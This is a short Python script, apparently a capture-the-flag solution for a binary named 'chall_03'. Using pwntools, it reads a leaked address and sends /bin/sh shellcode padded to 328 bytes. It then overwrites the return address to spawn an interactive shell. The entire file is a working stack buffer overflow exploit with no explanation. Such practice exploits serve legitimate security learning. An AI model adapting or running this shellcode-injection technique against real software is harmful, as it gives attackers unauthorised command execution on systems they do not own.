# coding: utf-8
from pwn import *
p=process("./chall_03")
p.recvuntil(b") ")
leak = p.recvline()
shelladdr = int(leak, 16)
context.arch="amd64"
shellcode = asm(shellcraft.sh())
payload = shellcode + (328 - len(shellcode)) * b"A" + p64(shelladdr)
p.sendline(payload)
p.interactive()
